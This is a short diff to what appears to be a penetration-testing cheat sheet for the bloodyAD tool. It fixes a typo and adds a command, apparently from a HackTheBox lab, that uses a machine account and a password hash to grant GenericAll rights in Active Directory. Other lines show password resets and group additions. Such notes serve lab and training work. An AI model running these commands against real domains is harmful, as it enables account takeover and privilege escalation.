@@ -16,6 +16,11 @@ bloodyAD -d domain.local --host x.x.x.x -u username -p username set password tar
 #### Add user to a group
 
 ```bash
-bloodAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
+bloodyAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
+```
+#### Add GenericAll to a user account
+
+```bash
+bloodyAD -d haze.htb --host 10.129.232.50 -u 'haze-IT-backup$' -p :4de830d1d58c14e241aff55f82ecdba1 add genericAll 'SUPPORT_SERVICES' 'haze-IT-backup$'
 ```
 
